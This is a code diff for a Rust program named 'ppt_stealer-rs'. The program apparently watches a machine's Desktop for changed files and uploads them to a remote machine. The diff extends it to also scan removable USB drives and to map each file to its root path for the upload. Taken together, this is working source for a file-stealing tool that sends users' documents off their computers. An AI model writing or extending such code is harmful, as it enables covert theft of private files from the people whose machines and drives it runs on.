@@ -12,13 +12,13 @@ use std::thread::sleep;
 use std::time::Duration;
 use std::{self, str::FromStr};
 use std::path::{PathBuf, Path};
-use sysinfo::{Disk, System};
+use sysinfo::Disks;
 
 mod watch_dog;
 mod connection_tools;
 
 #[derive(Parser, Debug)]
-#[command(name = "ppt_stealer-rs", version = "0.2-beta.3")]
+#[command(name = "ppt_stealer-rs", version = "0.2-beta.4")]
 #[command(about, long_about = None, author)]
 #[command(color = clap::ColorChoice::Always)]
 #[command(help_template = "\
@@ -158,12 +158,52 @@ fn no_gui(desktop_path: &Path, args: Cli) {
         }
     }).expect("Error setting Ctrl+C handler.");
 
+    
+    
+
     log::info!("Start monitering files...");
 
     let mut file_hashes: HashMap<PathBuf, String> = HashMap::new();
 
     loop {
-        let path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);
+
+        // detect existing USB devices
+        let mut disk_list = vec![];
+        if args.usb {
+            let disks = Disks::new_with_refreshed_list();
+            
+            for disk in disks.iter().filter(|d| d.is_removable()) {
+                disk_list.push(disk.mount_point().to_str().unwrap().to_string());
+            }
+        }
+
+        let mut root_of_paths_map: HashMap<PathBuf, PathBuf> = HashMap::new();
+
+        let mut path_bufs: Vec<PathBuf> = vec![];
+
+        let mut temp_path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);
+
+        path_bufs.append(&mut temp_path_bufs);
+
+        let cloned_path_bufs = path_bufs.clone();
+
+        for path in cloned_path_bufs.iter() {
+            root_of_paths_map.insert(path.clone(), desktop_path.to_path_buf());
+        }
+
+        let mut temp_path_bufs: Vec<PathBuf> =vec![];
+        for disk in disk_list.iter() {
+            let disk_path = Path::new(disk);
+            temp_path_bufs = watch_dog::file_moniter(disk_path);
+            for path in temp_path_bufs.iter() {
+                root_of_paths_map.insert(path.clone(), disk_path.to_path_buf());
+            }
+            temp_path_bufs.append(&mut watch_dog::file_moniter(disk_path));
+        }
+        path_bufs.append(&mut temp_path_bufs);
+        
+
+        // detect newly plugged in USB devices
 
         // let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();
 
@@ -178,15 +218,14 @@ fn no_gui(desktop_path: &Path, args: Cli) {
 
             file_hashes = new_file_hashes;
 
-            // upload_changed_files_deprecated(changed_files.clone(), &args, &sess);
-
             log::info!("Uploading changed files...");
 
             let files_and_roots_path = {
                 let mut files_and_roots_path: Vec<[&Path; 2]> = vec![];
                 for path in changed_files.iter() {
-                    let root_path = desktop_path;   // TODO: Make this configurable.
-                    files_and_roots_path.push([path, root_path]);
+                    log::debug!("Get root path of {}", path.display());
+                    let root_path = root_of_paths_map.get(path.as_path()).unwrap();   // TODO: Make this configurable.
+                    files_and_roots_path.push([path.as_path(), root_path]);
                 }
                 files_and_roots_path
             };
@@ -318,6 +357,7 @@ fn upload_files(files_and_roots_path: &[[&Path; 2]], args: &Cli, sess: &Arc<Mute
 
     // TODO: get relative path of files, create corresponding folders on the remote machine, and upload files.
     for [file_path, root_path] in files_and_roots_path.iter() {
+        log::debug!("Stripping prefix of file path {} by root path {}", file_path.display(), root_path.parent().unwrap().display());
         let relative_path = file_path
                                     .strip_prefix(root_path.parent()
                                         .expect(&format!(
